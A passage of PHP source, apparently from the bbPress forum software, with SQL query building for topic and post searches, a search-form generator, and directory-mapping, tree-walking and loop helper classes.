			$order_by = 'p.post_time';

		$bits = compact( array('distinct', 'sql_calc_found_rows', 'fields', 'index_hint', 'join', 'where', 'group_by', 'having', 'order_by') );
		$this->request = $this->_filter_sql( $bits, "$bbdb->posts AS p" );

		return $this->request;
	}

	function generate_topic_title_sql( $string ) {
		global $bbdb;
		$string = trim($string);

		if ( !preg_match_all('/".*?("|$)|((?<=[\s",+])|^)[^\s",+]+/', $string, $matches) ) {
			$string = $bbdb->escape($string);
			return "(t.topic_title LIKE '%$string%')";
		}

		$where = '';

		foreach ( $matches[0] as $match ) {
			$term = trim($match, "\"\n\r ");
			$term = $bbdb->escape($term);
			$where .= " AND t.topic_title LIKE '%$term%'";
		}

		if ( count($matches[0]) > 1 && $string != $matches[0][0] ) {
			$string = $bbdb->escape($string);
			$where .= " OR t.topic_title LIKE '%$string%'";
		}

		return '(' . substr($where, 5) . ')';
	}

	function generate_post_text_sql( $string ) {
		global $bbdb;
		$string = trim($string);
		$_string = $bbdb->escape( $string );
		if ( strlen($string) < 5 )
			return "p.post_text LIKE '%$_string%'";

		return $this->match_query = "MATCH(p.post_text) AGAINST('$_string')";
	}

	function _filter_sql( $bits, $from ) {
		global $bbdb;

		$q =& $this->query_vars;

		// MySQL 5.1 allows multiple index hints per query - earlier versions only get the first hint
		if ( $bits['index_hint'] ) {
			if ( !is_array( $bits['index_hint'] ) ) {
				$bits['index_hint'] = array( (string) $bits['index_hint'] );
			}
			if ( $bbdb->has_cap( 'index_hint_for_any' ) ) {
				// 5.1 <= MySQL
				$_regex = '/\s*(USE|IGNORE|FORCE)\s+(INDEX|KEY)\s+(FOR\s+(JOIN|ORDER\s+BY|GROUP\s+BY)\s+)?\(\s*`?[a-z0-9_]+`?(\s*,\s*`?[a-z0-9_]+`?)*\s*\)\s*/i';
			} elseif ( $bbdb->has_cap( 'index_hint_for_join' ) ) {
				// 5.0 <= MySQL < 5.1
				$_regex = '/\s*(USE|IGNORE|FORCE)\s+(INDEX|KEY)\s+(FOR\s+JOIN\s+)?\(\s*`?[a-z0-9_]+`?(\s*,\s*`?[a-z0-9_]+`?)*\s*\)\s*/i';
			} else {
				// MySQL < 5.0
				$_regex = '/\s*(USE|IGNORE|FORCE)\s+(INDEX|KEY)\s+\(\s*`?[a-z0-9_]+`?(\s*,\s*`?[a-z0-9_]+`?)*\s*\)\s*/i';
			}
			$_index_hint = array();
			foreach ( $bits['index_hint'] as $_hint ) {
				if ( preg_match( $_regex, $_hint ) ) {
					$_index_hint[] = trim( $_hint );
				}
			}
			unset( $_regex, $_hint );
			if ( $bbdb->has_cap( 'index_hint_lists' ) ) {
				// 5.1 <= MySQL
				$bits['index_hint'] = join( ' ', $_index_hint );
			} else {
				// MySQL < 5.1
				$bits['index_hint'] = isset( $_index_hint[0] ) ? $_index_hint[0] : '';
			}
			unset( $_index_hint );
		}

		$q['order'] = strtoupper($q['order']);
		if ( $q['order'] && in_array($q['order'], array('ASC', 'DESC')) )
			$bits['order_by'] .= " $q[order]";
		else
			$bits['order_by'] .= " DESC";

		if ( !$q['per_page'] )
			$q['per_page'] = (int) bb_get_option( 'page_topics' );

		$bits['limit'] = '';
		if ( $q['per_page'] > 0 ) :
			if ( $q['page'] > 1 )
				$bits['limit'] .= $q['per_page'] * ( $q['page'] - 1 ) . ", ";
			$bits['limit'] .= $q['per_page'];
		endif;

		$name = "get_{$this->type}s_";

		// Unfiltered
		$sql_calc_found_rows = $bits['sql_calc_found_rows'];
		unset($bits['sql_calc_found_rows']);

		foreach ( $bits as $bit => $value ) {
			if ( $this->query_id )
				$value = apply_filters( "{$this->query_id}_$bit", $value );
			$$bit = apply_filters( "$name$bit", $value );
		}

		if ( $where )
			$where = "WHERE $where";
		if ( $group_by )
			$group_by = "GROUP BY $group_by";
		if ( $having )
			$having = "HAVING $having";
		if ( $order_by )
			$order_by = "ORDER BY $order_by";
		if ( $limit )
			$limit = "LIMIT $limit";

		return "SELECT $distinct $sql_calc_found_rows $fields FROM $from $index_hint $join $where $group_by $having $order_by $limit";
	}

	function parse_value( $field, $value = '' ) {
		if ( !$value && !is_numeric($value) )
			return '';

		global $bbdb;

		$op = substr($value, 0, 1);

		// #, =whatever, <#, >#.  Cannot do < and > at same time
		if ( in_array($op, array('<', '=', '>')) ) :
			$value = substr($value, 1);
			$value = is_numeric($value) ? (float) $value : $bbdb->escape( $value );
			return " AND $field $op '$value'";
		elseif ( false === strpos($value, ',') && 'NULL' !== $value && '-NULL' !== $value ) :
			$value = is_numeric($value) ? (float) $value : $bbdb->escape( $value );
			return '-' == $op ? " AND $field != '" . substr($value, 1) . "'" : " AND $field = '$value'";
		endif;

		$y = $n = array();
		foreach ( explode(',', $value) as $v ) {
			$v = is_numeric($v) ? (int) $v : $bbdb->escape( $v );
			if ( '-' == substr($v, 0, 1) )
				if ( $v === '-NULL' )
					$not_null_flag = true;
				else
					$n[] = substr($v, 1);
			else
				if ( $v === 'NULL' )
					$null_flag = true;
				else
					$y[] = $v;
		}

		$r = '';
		if ( $y ) {
			$r .= " AND ";
			if ( $null_flag )
				$r .= "(";
			$r .= "$field IN ('" . join("','", $y) . "')";
			if ( $null_flag )
				$r .= " OR $field IS NULL)";
		} elseif ( $null_flag ) {
			$r .= " AND $field IS NULL";
		}
		
		if ( $n ) {
			$r .= " AND ";
			if ( $not_null_flag )
				$r .= "(";
			$r .= "$field NOT IN ('" . join("','", $n) . "')";
			if ( $not_null_flag )
				$r .= " AND $field IS NOT NULL)";
		} elseif ( $not_null_flag ) {
			$r .= " AND $field IS NOT NULL";
		}

		return $r;
	}

	function date( $field, $date ) {
		if ( !$date && !is_int($date) )
			return '';

		$op = substr($date, 0, 1);
		if ( in_array($op, array('>', '<')) ) :
			$date = (int) substr($date, 1, 14);
			if ( strlen($date) < 14 )
				$date .= str_repeat('0', 14 - strlen($date));
			return " AND $field $op $date";
		endif;

		$date = (int) $date;
		$r = " AND YEAR($field) = " . substr($date, 0, 4);
		if ( strlen($date) > 5 )
			$r .= " AND MONTH($field) = " . substr($date, 4, 2);
		if ( strlen($date) > 7 )
			$r .= " AND DAYOFMONTH($field) = " . substr($date, 6, 2);
		if ( strlen($date) > 9 )
			$r .= " AND HOUR($field) = " . substr($date, 8, 2);
		if ( strlen($date) > 11 )
			$r .= " AND MINUTE($field) = " . substr($date, 10, 2);
		if ( strlen($date) > 13 )
			$r .= " AND SECOND($field) = " . substr($date, 12, 2);
		return $r;
	}

	function error( $code, $message ) {
		if ( is_wp_error($this->errors) )
			$this->errors->add( $code, $message );
		else
			$this->errors = new WP_Error( $code, $message );
	}
}

class BB_Query_Form extends BB_Query {
	var $defaults;
	var $allowed;

	// Can optionally pass unique id string to help out filters
	function BB_Query_Form( $type = 'topic', $defaults = '', $allowed = '', $id = '' ) {
		$this->defaults = wp_parse_args( $defaults );
		$this->allowed  = wp_parse_args( $allowed );
		if ( !empty($defaults) || !empty($allowed) )
			$this->query_from_env($type, $defaults, $allowed, $id);
	}

	function form( $args = null ) {
		$_post = 'post' == $this->type;

		$defaults = array(
			'search' => true,
			'forum'  => true,
			'tag'    => false,
			'open'   => false,
			'topic_author' => false,
			'post_author'  => false,
			'topic_status' => false,
			'post_status'  => false,
			'topic_title'  => false,

			'method' => 'get',
			'submit' => __('Search &#187;'),
			'action' => ''
		);
		$defaults['id'] = $_post ? 'post-search-form' : 'topic-search-form';

		$args = wp_parse_args( $args, $defaults );
		extract( $args, EXTR_SKIP );

		$id = attribute_escape( $id );
		$method = 'get' == strtolower($method) ? 'get' : 'post';
		$submit = attribute_escape( $submit );
		$action = clean_url( $action );

		if ( $this->query_vars )
			$query_vars =& $this->query_vars;
		else
			$query_vars = $this->fill_query_vars( $this->defaults );

		extract($query_vars, EXTR_PREFIX_ALL, 'q');

		$r  = "<form action='' method='$method' id='$id' class='search-form'>\n";

		if ( $search ) {
			if ( $_post ) {
				$s_value = attribute_escape( $q_post_text );
				$s_name = 'post_text';
				$s_id = 'post-text';
			} else {
				$s_value = attribute_escape( $q_search );
				$s_name = $s_id = 'search';
			}
			$r .= "\t<fieldset><legend>" . __('Search&#8230;') . "</legend>\n";
			$r .= "\t\t<input name='$s_name' id='$s_id' type='text' class='text-input' value='$s_value' />";
			$r .= "\t</fieldset>\n\n";
		}

		if ( $forum ) {
			$r .= "\t<fieldset><legend>" . __('Forum&#8230;')  . "</legend>\n";
			$r .= bb_get_forum_dropdown( array('selected' => $q_forum_id, 'none' => __('Any')) );
			$r .= "\t</fieldset>\n\n";
		}

		if ( $tag ) {
			$q_tag = attribute_escape( $q_tag );
			$r .= "\t<fieldset><legend>" .  __('Tag&#8230;') . "</legend>\n";
			$r .= "\t\t<input name='tag' id='topic-tag' type='text' class='text-input' value='$q_tag' />";
			$r .= "\t</fieldset>\n\n";
		}

		if ( $topic_author ) {
			$q_topic_author = attribute_escape( $q_topic_author );
			$r .= "\t<fieldset><legend>" . __('Topic Author&#8230;') . "</legend>\n";
			$r .= "\t\t<input name='topic_author' id='topic-author' type='text' class='text-input' value='$q_topic_author' />";
			$r .= "\t</fieldset>\n\n";
		}

		if ( $post_author ) {
			$q_post_author = attribute_escape( $q_post_author );
			$r .= "\t<fieldset><legend>" . __('Post Author&#8230;') . "</legend>\n";
			$r .= "\t\t<input name='post_author' id='post-author' type='text' class='text-input' value='$q_post_author' />";
			$r .= "\t</fieldset>\n\n";
		}

		$stati = array( 'all' => __('All'), '0' => __('Normal'), '1' => __('Deleted') );

		if ( $topic_status ) {
			$r .= "\t<fieldset><legend>" . __('Topic Status&#8230;') . "</legend>\n";
			$r .= "\t\t<select name='topic_status' id='topic-status'>\n";
			foreach ( $stati as $status => $label ) {
				$selected = (string) $status == (string) $q_topic_status ? " selected='selected'" : '';
				$r .= "\t\t\t<option value='$status'$selected>$label</option>\n";
			}
			$r .= "\t\t</select>\n";
			$r .= "\t</fieldset>\n\n";
		}

		if ( $post_status ) {
			$r .= "\t<fieldset><legend>" . __('Post Status&#8230;') . "</legend>\n";
			$r .= "\t\t<select name='post_status' id='post-status'>\n";
			foreach ( $stati as $status => $label ) {
				$selected = (string) $status == (string) $q_post_status ? " selected='selected'" : '';
				$r .= "\t\t\t<option value='$status'$selected>$label</option>\n";
			}
			$r .= "\t\t</select>\n";
			$r .= "\t</fieldset>\n\n";
		}

		if ( $open ) {
			$r .= "\t<fieldset><legend>" . __('Open?&#8230;') . "</legend>\n";
			$r .= "\t\t<select name='open' id='topic-open'>\n";
			foreach ( array( 'all' => __('All'), '1' => __('Open'), '0' => __('Closed') ) as $status => $label ) {
				$label = wp_specialchars( $label );
				$selected = (string) $status == (string) $q_open ? " selected='selected'" : '';
				$r .= "\t\t\t<option value='$status'$selected>$label</option>\n";
			}
			$r .= "\t\t</select>\n";
			$r .= "\t</fieldset>\n\n";
		}

		if ( $topic_title ) {
			$q_topic_title = attribute_escape( $q_topic_title );
			$r .= "\t<fieldset><legend>" . __('Title&#8230;') . "</legend>\n";
			$r .= "\t\t<input name='topic_title' id='topic-title' type='text' class='text-input' value='$q_topic_title' />";
			$r .= "\t</fieldset>\n\n";
		}

		$r .= "\t<p class='submit'>\n";
		$r .= "\t\t<input type='submit' class='button submit-input' value='$submit' id='$id-submit' />\n";
		$r .= "\t</p>\n";
		$r .= "</form>\n\n";

		echo $r;
	}
}

class BB_Dir_Map {
	var $root;
	var $callback;
	var $callback_args;
	var $keep_empty;
	var $apply_to;
	var $recurse;
	var $dots;
	var $flat = array();
	var $error = false;

	var $_current_root;
	var $_current_file;

	function BB_DIR_MAP( $root, $args = '' ) {
		if ( !is_dir( $root ) ) {
			$this->error = new WP_Error( 'bb_dir_map', __('Not a valid directory') );
			return;
		}

		$this->parse_args( $args );
		if ( is_null($this->apply_to) || is_null($this->dots) ) {
			$this->error = new WP_Error( 'bb_dir_map', __('Invalid arguments') );
			return;
		}
		$this->_current_root = $this->root = rtrim($root, '/\\');
		$this->map();
	}

	function parse_args( $args ) {
		// callback: should be callable
		// callback_args: additional args to pass to callback
		// apply_to: all, files, dirs
		// keep_empty: (bool)
		// recurse: (int) depth, -1 = infinite
		// dots: true (everything), false (nothing), nosvn
		$defaults = array( 'callback' => false, 'callback_args' => false, 'keep_empty' => false, 'apply_to' => 'files', 'recurse' => -1, 'dots' => false );
		$this->callback = is_array($args) && isset($args['callback']) ? $args['callback'] : false;
		$args = wp_parse_args( $args, $defaults );

		foreach ( array('callback', 'keep_empty', 'dots') as $a )
			if ( 'false' == $args[$a] )
				$args[$a] = false;
			elseif ( 'true' == $args[$a] )
				$args[$a] = true;

		if ( !isset($this->callback) )
			$this->callback = $args['callback'];
		if ( !is_callable($this->callback) )
			$this->callback = false;
		$this->callback_args = is_array($args['callback_args']) ? $args['callback_args'] : array();

		$this->keep_empty = (bool) $args['keep_empty'];

		$_apply_to = array( 'files' => 1, 'dirs' => 2, 'all' => 3 ); // This begs to be bitwise
		$this->apply_to = @$_apply_to[$args['apply_to']];

		$this->recurse = (int) $args['recurse'];

		$_dots = array( 1 => 3, 0 => 0, 'nosvn' => 1 ); // bitwise here is a little silly
		$this->dots = @$_dots[$args['dots']];
	}

	function map( $root = false ) {
		$return = array();
		$_dir = dir($root ? $root : $this->_current_root);
		while ( false !== ( $this->_current_file = $_dir->read() ) ) {
			if ( in_array($this->_current_file, array('.', '..')) )
				continue;
			if ( !$this->dots && '.' == $this->_current_file{0} )
				continue;

			$item = $_dir->path . DIRECTORY_SEPARATOR . $this->_current_file;
			$_item = substr( $item, strlen($this->root) + 1 );
			$_callback_args = $this->callback_args;
			array_push( $_callback_args, $item, $_item ); // $item, $_item will be last two args
			if ( is_dir($item) )  { // dir stuff
				if ( 1 & $this->dots && in_array($this->_current_file, array('.svn', 'CVS')) )
					continue;
				if ( 2 & $this->apply_to ) {
					$result = $this->callback ? call_user_func_array($this->callback, $_callback_args) : true;
					if ( $result || $this->keep_empty )
						$this->flat[$_item] = $result;
				}
				if ( 0 > $this->recurse || $this->recurse ) {
					$this->recurse--;
					$this->map( $item );
					$this->recurse++;
				}
			} else { // file stuff
				if ( !(1 & $this->apply_to) )
					continue;
				$result = $this->callback ? call_user_func_array($this->callback, $_callback_args) : true;
				if ( $result || $this->keep_empty )
					$this->flat[$_item] = $result;
			}
		}
	}

	function get_results() {
		return is_wp_error( $this->error ) ? $this->error : $this->flat;
	}
}

class BB_Walker {
	var $tree_type;
	var $db_fields;

	//abstract callbacks
	function start_lvl($output) { return $output; }
	function end_lvl($output)   { return $output; }
	function start_el($output)  { return $output; }
	function end_el($output)    { return $output; }

	function _init() {
		$this->parents = array();
		$this->depth = 1;
		$this->previous_element = '';
	}		

	function walk($elements, $to_depth) {
		$args = array_slice(func_get_args(), 2);
		$output = '';

		// padding at the end
		$last_element->{$this->db_fields['parent']} = 0;
		$last_element->{$this->db_fields['id']} = 0;
		$elements[] = $last_element;

		$flat = ($to_depth == -1) ? true : false;
		foreach ( $elements as $element )
			$output .= call_user_func_array( array(&$this, 'step'), array_merge( array($element, $to_depth), $args ) );

		return $output;
	}

	function step( $element, $to_depth ) {
		if ( !isset($this->depth) )
			$this->_init();

		$args = array_slice(func_get_args(), 2);
		$id_field = $this->db_fields['id'];
		$parent_field = $this->db_fields['parent'];

		$flat = ($to_depth == -1) ? true : false;

		$output = '';

		// If flat, start and end the element and skip the level checks.
		if ( $flat ) {
			// Start the element.
			if ( isset($element->$id_field) && $element->$id_field != 0 ) {
				$cb_args = array_merge( array(&$output, $element, $this->depth - 1), $args);
				call_user_func_array(array(&$this, 'start_el'), $cb_args);
			}

			// End the element.
			if ( isset($element->$id_field) && $element->$id_field != 0 ) {
				$cb_args = array_merge( array(&$output, $element, $this->depth - 1), $args);
				call_user_func_array(array(&$this, 'end_el'), $cb_args);
			}

			return;
		}

		// Walk the tree.
		if ( !empty($this->previous_element) && ($element->$parent_field == $this->previous_element->$id_field) ) {
			// Previous element is my parent. Descend a level.
			array_unshift($this->parents, $this->previous_element);
			if ( !$to_depth || ($this->depth < $to_depth) ) { //only descend if we're below $to_depth
				$cb_args = array_merge( array(&$output, $this->depth), $args);
				call_user_func_array(array(&$this, 'start_lvl'), $cb_args);
			} else if ( $to_depth && $this->depth == $to_depth  ) {  // If we've reached depth, end the previous element.
				$cb_args = array_merge( array(&$output, $this->previous_element, $this->depth), $args);
				call_user_func_array(array(&$this, 'end_el'), $cb_args);
			}
			$this->depth++; //always do this so when we start the element further down, we know where we are
		} else if ( $element->$parent_field == $this->previous_element->$parent_field) {
			// On the same level as previous element.
			if ( !$to_depth || ($this->depth <= $to_depth) ) {
				$cb_args = array_merge( array(&$output, $this->previous_element, $this->depth - 1), $args);
				call_user_func_array(array(&$this, 'end_el'), $cb_args);
			}
		} else if ( $this->depth > 1 ) {
			// Ascend one or more levels.
			if ( !$to_depth || ($this->depth <= $to_depth) ) {
				$cb_args = array_merge( array(&$output, $this->previous_element, $this->depth - 1), $args);
				call_user_func_array(array(&$this, 'end_el'), $cb_args);
			}

			while ( $parent = array_shift($this->parents) ) {
				$this->depth--;
				if ( !$to_depth || ($this->depth < $to_depth) ) {
					$cb_args = array_merge( array(&$output, $this->depth), $args);
					call_user_func_array(array(&$this, 'end_lvl'), $cb_args);
					$cb_args = array_merge( array(&$output, $parent, $this->depth - 1), $args);
					call_user_func_array(array(&$this, 'end_el'), $cb_args);
				}
				if ( isset($this->parents[0]) && $element->$parent_field == $this->parents[0]->$id_field ) {
					break;
				}
			}
		} else if ( !empty($this->previous_element) ) {
			// Close off previous element.
			if ( !$to_depth || ($this->depth <= $to_depth) ) {
				$cb_args = array_merge( array(&$output, $this->previous_element, $this->depth - 1), $args);
				call_user_func_array(array(&$this, 'end_el'), $cb_args);
			}
		}

		// Start the element.
		if ( !$to_depth || ($this->depth <= $to_depth) ) {
			if ( $element->$id_field != 0 ) {
				$cb_args = array_merge( array(&$output, $element, $this->depth - 1), $args);
				call_user_func_array(array(&$this, 'start_el'), $cb_args);
			}
		}

		$this->previous_element = $element;
		return $output;
	}
}

class BB_Walker_Blank extends BB_Walker { // Used for template functions
	var $tree_type;
	var $db_fields = array( 'id' => '', 'parent' => '' );

	var $start_lvl = '';
	var $end_lvl   = '';

	//abstract callbacks
	function start_lvl( $output, $depth ) { 
		if ( !$this->start_lvl )
			return '';
		$indent = str_repeat("\t", $depth);
		$output .= $indent . "$this->start_lvl\n";
		return $output;
	}

	function end_lvl( $output, $depth )   {
		if ( !$this->end_lvl )
			return '';
		$indent = str_repeat("\t", $depth);
		$output .= $indent . "$this->end_lvl\n";
		return $output;
	}

	function start_el()  { return ''; }
	function end_el()    { return ''; }
}

class BB_Loop {
	var $elements;
	var $walker;
	var $_preserve = array();
	var $_looping = false;

	function &start( $elements, $walker = 'BB_Walker_Blank' ) {
		$a = new BB_Loop( $elements );
		if ( !$a->elements )
			return null;
		$a->walker = new $walker;
		return $a;
	}

	function BB_Loop( &$elements ) {
		$this->elements = $elements;
		if ( !is_array($this->elements) || empty($this->elements) )
			return $this->elements = false;
	}

	function step() {
		if ( !is_array($this->elements) || !current($this->elements) || !is_object($this->walker) )
			return false;

		if ( !$this->_looping ) {
			$r = reset($this->elements);
			$this->_looping = true;
		} else {
			$r = next($this->elements);
		}

		if ( !$args = func_get_args() )
			$args = array( 0 );
		echo call_user_func_array( array(&$this->walker, 'step'), array_merge(array(current($this->elements)), $args) );
		return $r;
	}

	function pad( $pad, $offset = 0 ) {
		if ( !is_array($this->elements) || !is_object($this->walker) )
			return false;

		if ( is_numeric($pad) )
			return $pad * ($this->walker->depth - 1) + (int) $offset;

		return str_repeat( $pad, $this->walker->depth - 1 );
	}

	function preserve( $array ) {
		if ( !is_array( $array ) )
			return false;

		foreach ( $array as $key )
			$this->_preserve[$key] = $GLOBALS[$key];
	}

	function reinstate() {
		foreach ( $this->_preserve as $key => $value )
			$GLOBALS[$key] = $value;
	}

	function classes() {
		if ( !is_array($this->elements) || !is_object($this->walker) )
			return false;
		$classes = array();

		$current = current($this->elements);

		if ( $prev = prev($this->elements) )
			next($this->elements);
		else		
			reset($this->elements);

		if ( $next = next($this->elements) )
			prev($this->elements);
		else
			end($this->elements);

		if ( $next->{$this->walker->db_fields['parent']} == $current->{$this->walker->db_fields['id']} )
			$classes[] = 'bb-parent';
		elseif ( $next->{$this->walker->db_fields['parent']} == $current->{$this->walker->db_fields['parent']} )
			$classes[] = 'bb-precedes-sibling';
		else
			$classes[] = 'bb-last-child';

		if ( $current->{$this->walker->db_fields['parent']} == $prev->{$this->walker->db_fields['id']} )
			$classes[] = 'bb-first-child';
		elseif ( $current->{$this->walker->db_fields['parent']} == $prev->{$this->walker->db_fields['parent']} )
			$classes[] = 'bb-follows-sibling';
		elseif ( $prev )
			$classes[] = 'bb-follows-niece';

		if ( $this->walker->depth > 1 )
			$classes[] = 'bb-child';
		else
			$classes[] = 'bb-root';

		$classes = join(' ', $classes);
		return $classes;
	}

}

?>
